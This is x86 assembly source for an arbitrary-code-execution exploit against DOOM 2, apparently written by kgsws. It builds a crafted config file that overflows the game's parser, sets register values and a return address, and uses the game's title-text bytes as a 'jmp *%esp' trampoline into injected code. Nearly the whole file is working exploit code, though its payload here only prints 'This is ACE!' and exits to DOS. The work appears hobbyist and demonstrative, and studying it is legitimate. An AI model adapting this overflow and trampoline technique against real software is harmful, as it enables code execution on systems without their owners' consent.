//// kgsws' DOOM2 ACE engine
//////////////////////////////
//
// The exploit actually uses Doom title text as an executable code.
// This is probably the only guaranteed byte stream with known location.
// For compatibility with shareware version there are two variations, both handled by the same exploit.
// All this works because of luck. Luck that those texts happen to translate into useful opcodes.
// Well, at least indirectly. Useful opcode modifies next instruction for something better - 'jmp *%esp'.
//
// "DOOM 2: Hell on Earth v1.9"
// 76 74                	jbe    0x76
// 31 74 2e 74          	xor    %esi,0x74(%esi,%ebp,1)
// 39 74 20 74          	cmp    %esi,0x74(%eax,%eiz,1)
//
// "DOOM System Startup v1.9"
// 31 74 2e 74          	xor    %esi,0x74(%esi,%ebp,1)
// 39 74 20 74          	cmp    %esi,0x74(%eax,%eiz,1)
// 20 74 20 74          	and    %dh,0x74(%eax,%eiz,1)
//
// XOR with 0x90C690C6 from 0x74397439 to 0xE4FFE4FF
// addr	0x000B8062
// ESI	0x90C690C6
// EBP	0x6F44EF28
//

.section .text
.globl _start

_start:
	// dummy config option name + separator
	.ascii	"haax\t"

	//// This part has to contain exact number of any characters except NEWLINE or EOF.

	// credits
	.ascii	"++++++++++++++++"
	.ascii	"+..Arbitrary...+"
	.ascii	"+.....code.....+"
	.ascii	"+...execution..+"
	.ascii	"+..............+"
	.ascii	"+.....for......+"
	.ascii	"+....DOOM.2....+"
	.ascii	"+..............+"
	.ascii	"+...by.kgsws...+"
	.ascii	"++++++++++++++++"
	.ascii	"\\______________/"

	// filler
	.ascii	"........"

	// This is a pointer to FILE structure. It is used in feof() call to stop the parsing loop.
	// Target location should be valid and act as if EOF flag is set.
	.4byte	0x000b8001

	// value of EBP
	.4byte	0x6F44EF28

	// value of EDI
	.4byte	0x00000000

	// value of ESI
	.4byte	0x90C690C6

	// value of EDX
	.4byte	0x00000000

	// value of ECX
	.4byte	0x00000000

	// value of EBX
	.4byte	0x00000000

	// the exploit - address to jump at
	.4byte	0x000b805e

	//
	// The Code
the_code:

	// recover base pointer
	mov	-232(%esp),%esi

	// recover DATA pointer
	mov	5(%esi),%edi
	sub	$0x2b6e4,%edi	// EDI contains DATA base

	// recover CODE pointer
	sub	$0x24540,%esi	// ESI contains CODE base

	// custom error message

	// get address of 'printf' function
	mov	$0x3FE40,%eax
	add	%esi,%eax

	// get address of custom text
	mov	$text-the_code,%ebx
	add	%esp,%ebx

	// push text
	push	%ebx

	// call 'printf'
	call *%eax

	// exit to DOS
	mov	$0x4c01,%ax
	int	$0x21

text:
	.string	"This is ACE!"

